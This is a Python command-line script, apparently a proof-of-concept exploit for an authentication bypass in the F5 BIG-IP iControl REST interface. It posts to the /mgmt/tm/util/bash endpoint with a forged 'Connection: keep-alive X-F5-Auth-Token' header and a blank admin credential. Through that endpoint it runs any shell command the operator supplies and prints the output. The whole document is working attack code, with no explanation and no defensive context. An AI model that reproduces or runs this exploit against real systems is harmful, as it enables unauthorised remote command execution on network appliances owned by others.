from requests.packages import urllib3
import requests
import click

urllib3.disable_warnings()


@click.command()
@click.option("-t", required="true", help="domain name or IP address")
@click.option("-cmd", required="true", help="command what you want")
def exploit(t, cmd):
    url = r"https://%s/mgmt/tm/util/bash"%t
    headers = {
        'Host': '%s'%t,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0',
        'Authorization': 'Basic YWRtaW46',        
        'Connection': 'keep-alive X-F5-Auth-Token',
        'X-F5-Auth-Token': '0',
        'Content-Type': 'application/json',
        'X-Forwarded-For': '127.0.0.1'
    }
    proxies = {
        "http": "http://127.0.0.1:7890",
        "https": "http://127.0.0.1:7890"
    }
    json = {"command":"run","utilCmdArgs":"-c '%s'"%cmd}
    print(url)
    for head in headers.items():
        print(head[0]+":"+head[1])
    print("\n")
    print(json)
    res = requests.post(url=url, headers=headers, json=json, timeout=30, proxies=proxies, verify=False)
    print(res.text)

if __name__ == "__main__":
    exploit()
